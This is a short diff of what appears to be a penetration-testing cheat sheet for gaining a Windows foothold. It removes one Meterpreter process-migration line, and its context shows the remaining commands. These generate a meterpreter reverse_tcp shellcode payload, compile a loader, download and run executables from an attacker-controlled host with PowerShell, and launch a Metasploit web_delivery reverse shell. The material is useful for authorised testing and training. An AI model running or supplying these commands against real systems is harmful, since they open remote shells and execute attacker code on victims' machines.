@@ -1261,7 +1261,6 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=443 -f csharp
 nano /Upload/windows/connect.cs   # edit IP/PORT/SHELLCODE
 mcs /Upload/windows/connect.cs
 powershell -c curl $MYIP/windows/Reflect.exe -o \windows\tasks\Reflect.exe; \windows\tasks\Reflect.exe http://$MYIP/windows/connect.exe
-migrate -N svchost.exe
 
 [###] Web Delivery (PowerShell)
 msfconsole -q -x 'use exploit/multi/script/web_delivery; setg SRVPORT 8888; setg LHOST $MYIP; setg LPORT 443; set TARGET PSH; setg PAYLOAD windows/x64/meterpreter/reverse_tcp; run'
